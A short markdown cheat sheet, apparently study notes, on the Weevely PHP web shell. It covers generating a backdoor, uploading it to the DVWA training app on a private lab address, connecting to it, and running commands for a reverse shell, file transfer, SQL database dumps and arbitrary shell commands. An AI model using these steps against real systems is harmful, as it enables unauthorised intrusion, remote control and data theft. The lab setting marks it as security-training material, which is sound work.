# Weevely

## Usage
1. Genrate backdoor in Kali
   - ```weevely generate [password] [file name]```
   -  ```weevely generate 123456 /root/shell.php```
2. Upload in vulnerable app (DVWA-Low)
3. Send a request to uploaded php file (run it)
   - *http://192.168.152.132/dvwa/hackable/uploads/shell.php*
4. Connect to shell from Kali
   - ```weevely [url o file] [password]```
   -  ```weevely http://192.168.152.132/dvwa/hackable/uploads/shell.php```

## Weevely commands
- List weevely functions
  - ```help```
- Help of a specific function 
  - ```[function name] -h```   
- Run weevely functions
  - ```[function name]```
- Download
  - ```file_download -vector [VECTOR] [FileName] -host [HOST] [location to store file]```
- Upload
  - ```file_upload -vector [VECTOR] [location on local machine] [location to store file]```
- Reverse shell
  - ```backdoor_reversetcp -vector [VECTOR] [Your IP] [PORT]```
- Access database
  - ```sql_console```
  - ```sql_dump -vector [VECTOR] -host [HOST] -lpath [location to store data] [DB Name] [username] [password]```
- Other functions
  - ```whoami``` 
  - ``` shell_sh [command]```
  - ```shell_sh -v [vector] [command]```
